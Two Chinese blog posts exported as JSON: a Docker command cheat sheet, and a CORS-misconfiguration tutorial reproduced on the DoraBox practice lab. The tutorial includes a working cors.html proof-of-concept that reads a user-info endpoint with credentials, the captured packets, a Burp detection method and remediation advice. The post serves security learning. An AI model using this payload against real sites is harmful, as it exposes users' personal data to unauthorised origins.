[{"content":"docker 容器 Docker 把代码及其所有依赖打包的一个标准单元，可以把一个程序从一个环境快速可靠的移植到另一个环境上运行。Docker 镜像是一个完整的、可靠的、独立的软件包，其中包含了运行程序所需要的一切。\n下载安装 官网下载 查找镜像 基本概念 Docker 的运行需要容器和镜像，镜像需要人来打包制作，容器在 Docker 运行镜像时会自动生成。或者我们可以手动生成容器，并使用参数来指定容器的名称、使用端口等信息。\n容器和镜像的区别\n镜像只能运行在底层内核上，通常只能用作一次性使用，不能保存保留任何数据。使用命令 docker run [镜像名] 的时候 docker 会自动生成一个容器，我们使用 docker exec 进入的通常都是容器而不是镜像。\n安装完成后使用 docker version 或 docker info 查看docker版本\n基础命令 通常使用docker的步骤包括但不限于\n查找镜像\n下载镜像\n运行镜像 - 创建容器\n进入容器\n停止容器\n启动容器\n删除容器\n删除镜像\n本章将按照步骤介绍常用命令以及所对应含义\n在此之前需要先掌握几条基本命令\n查看本地镜像：docker images 查看本地所有容器 docker ps -a 查看正在运行中的容器 docker ps 因为镜像没有运行这一说，所以使用 docker ps 命令实际上查看的是正在运行中的容器。\n1. 查找镜像 1-1 命令行查找远程镜像\n搜索镜像：docker search 名称 查看镜像 curl https://registry.hub.docker.com/v1/repositories/镜像名称/tags\ntags 根据镜像而定或多或少，更好的方式是通过网页点击查看历史 tags\n1-2 Docker Hub 网页查找镜像\n通过 Docker Hub 查找需要的镜像，找到 tags 标签\n2. 下载镜像 docker pull [REPOSITORY[:TAG]]\n完整 TAG 可以通过不同方式获取，在页面上可以通过 Docker Pull Command 提供的命令进行下载\n3. 运行镜像 在运行镜像时 docker 会自动生成一个提供访问和服务的容器并运行，我们可以通过参数指定这个容器的部分参数\n通过 docker images 可以查看镜像对应的ID\ndocker run 镜像ID 可以通过镜像创建并且运行容器\n1 2 3 4 5 6 7 docker run [options] 镜像ID options: --name 指定容器名称 -p 指定容器提供服务的端口 -i 创建交互式 -d 后台运行容器 使用 docker ps 可以查看所有正在运行中的容器\n4. 进入容器 docker exec -it 容器ID或名称 /bin/bash\n可以通过容器ID或通过创建容器时指定的名称进入，如果没有指定名称那么则由 docker 随机生成\n/bin/bash 则是指定进入容器所使用的 shell，可以更换为 /bin/sh 或是 /bin/zsh 等\n5. 停止容器 docker stop [容器ID 或 容器名]\n6. 启动容器 启动指定容器 docker start [容器ID 或 容器名]\n6. 删除容器 docker rm [容器ID 或 容器名]\n7. 删除镜像 docker rmi [OPTIONS] [镜像ID]\n1 2 3 Options: -f, --force 强制删除镜像 --no-prune 不删除没有附带标签的父级镜像 拓展用法 导出镜像 将容器导出为 tar 压缩包 docker export [容器ID 或 容器名] \u0026gt; [名称].tar\n导入镜像 将快照导入到镜像 cat [名称].tar | docker import - [容器名]\n通过 URL 导入容器 docker import http://example.com/exampleimage.tgz\n网络端口 docker ps 可以查看容器的端口映射，docker port 可以查看指定（ID或容器名）容器的端口映射具体情况\n查看端口映射情况 docker port [容器ID 或 容器名]\n容器状态 查看容器内的标准输出 docker logs [容器ID 或 容器名]\n查看容器内部日志 docker logs -f [容器ID 或 容器名]\n查看容器内部运行的程序 docker top [容器ID 或 容器名]\n使用 docker inspect [容器ID 或 容器名] 来查看 docker 的底层信息。它会返回一个记录着 docker 容器配置和状态信息的 JSON 格式文件。\n","date":"2022-08-10T16:22:29+08:00","permalink":"https://kylin.moe/p/%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8Bdocker%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/","title":"简单记录一下docker相关命令"},{"content":"漏洞介绍 首先明白几个概念 Origin（源）、SOP（同源策略） 和 CROS（跨域资源访问） 分别是什么\nOrigin（源） 访问 Web 内容时的协议（http://）、域名（example.com）和端口（:80）三者统称为源\nOrigin详解\nSOP（同源策略（Same Origin Policy）） 同源策略是基于浏览器的安全策略，它限制了网站之间不能随意互相读取和访问对方的资源。只有请求源（本地）和目标源（服务器）相同时，才能对相应资源进行读取。\n比方说黑客构建了一个站点，假如没有同源策略，你访问了这个恶意站点，那么黑客就可以获取到你访问页面的响应内容\n同源策略详解\nCORS（跨域资源共享（Cross-Origin Resource Sharing）） 随着发展，业务不满足于内部的资源访问，于是便有了CORS（跨域资源共享）机制，开发者可以配置具体允许哪些源对服务器的资源进行访问，但是如果未进行配置，用户只要在请求标头 Origin 字段中加入允许访问的地址，那么就可以构建任意的可允许访问的源（Access-Control-Allow-Origin）\n通常 Access-Control-Allow-Origin 字段会在服务器的相应数据包内\n请求标头Origin详解\n同源的例子\nhttp://example.com http://example.com/1.asp http://example.com/2.asp 不同源的例子\nhttp://example.com https://example.com http://example.com:8080 漏洞的产生\n上文提到了 请求标头 Origin 是可以构建的，假设服务器没有对字段做严格的限制，那么我们可以构造任意字段，让服务器的资源可提供给任意的第三方服务器。\n那么服务器同时满足下面三点要求，则可能构成CORS漏洞\n开启了 CORS（跨域资源共享） 未对Origin（请求标头）的内容做限制 未限制 Access-Control-Allow-Origin（允许访问的源） 字段 漏洞复现 相关靶场资源\nDoraBox靶场: https://github.com/0verSp4ce/DoraBox 本地搭建环境，访问 URL http://localhost/DoraBox/csrf/userinfo.php\n响应包内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 05 Aug 2022 20:35:19 GMT Content-Type: text/html; charset=UTF-8 Connection: close X-Powered-By: PHP/7.4.6 Access-Control-Allow-Origin: * Access-Control-Allow-Headers: X-Requested-With Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS Content-Length: 151 {\u0026#34;username\u0026#34;:\u0026#34;Vulkey_Chen\u0026#34;,\u0026#34;mobilephone\u0026#34;:\u0026#34;13188888888\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;admin@gh0st.cn\u0026#34;,\u0026#34;address\u0026#34;:\u0026#34;\\u4e2d\\u534e\\u4eba\\u6c11\\u5171\\u548c\\u56fd\u0026#34;,\u0026#34;sex\u0026#34;:\u0026#34;Cool Man\u0026#34;} Access-Control-Allow-Origin:* 允许所有域都具有访问资源的权限。\nAccess-Control-Allow-Credentials: true 允许将请求的响应内容暴露给前端的JavaScript代码\nAccess-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS 允许跨域访问资源的请求方式\n在本地构建 cors.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;cors exp\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { alert(this.responseText); document.getElementById(\u0026#34;demo\u0026#34;).innerHTML = this.responseText; } }; xhttp.open(\u0026#34;GET\u0026#34;, \u0026#34;http://localhost/DoraBox/csrf/userinfo.php\u0026#34;); xhttp.withCredentials = true; xhttp.send(); } cors(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 使用浏览器打开本地文件 report.html\n请求包\n1 2 3 4 5 6 7 8 9 10 11 GET /DoraBox/csrf/userinfo.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Origin: null Connection: close Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: cross-site 响应包\n1 2 3 4 5 6 7 8 9 10 11 12 13 HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 05 Aug 2022 20:43:19 GMT Content-Type: text/html; charset=UTF-8 Connection: close X-Powered-By: PHP/7.4.6 Access-Control-Allow-Origin: null Access-Control-Allow-Headers: X-Requested-With Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS Content-Length: 151 {\u0026#34;username\u0026#34;:\u0026#34;Vulkey_Chen\u0026#34;,\u0026#34;mobilephone\u0026#34;:\u0026#34;13188888888\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;admin@gh0st.cn\u0026#34;,\u0026#34;address\u0026#34;:\u0026#34;\\u4e2d\\u534e\\u4eba\\u6c11\\u5171\\u548c\\u56fd\u0026#34;,\u0026#34;sex\u0026#34;:\u0026#34;Cool Man\u0026#34;} report.html 通过 javascript 代码请求服务器资源，并且服务器返回了响应的资源，在存在 CORS 漏洞的前提下，可以通过 CORS 来访问服务器未授权的接口、或是一些用户的敏感信息。\n漏洞拓展 批量的检测方式\nBurpsuite 配置 Proxy - Options - Match and Replace 勾选 Request header Origin: foo.example.org\n历史数据包中过滤规则 Access-Control-Allow-Origin: foo.example.org\n修复方案 严格限制 Origin 字段的内容 配置 Access-Control-Allow-Origin 可访问的源 避免 Access-Control-Allow-Origin: null 信任形式建议配置为 *.example.com 或 .example.com 减少 Access-Control-Allow-Methods 允许的请求方式 参考文献 CORS跨域漏洞学习 - Lushun CORS跨域漏洞的学习 - FreeBuf网络安全行业门户 CORS - 术语表 | MDN (mozilla.org) ","date":"2022-08-09T14:01:02+08:00","permalink":"https://kylin.moe/p/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/","title":"测试文章"}]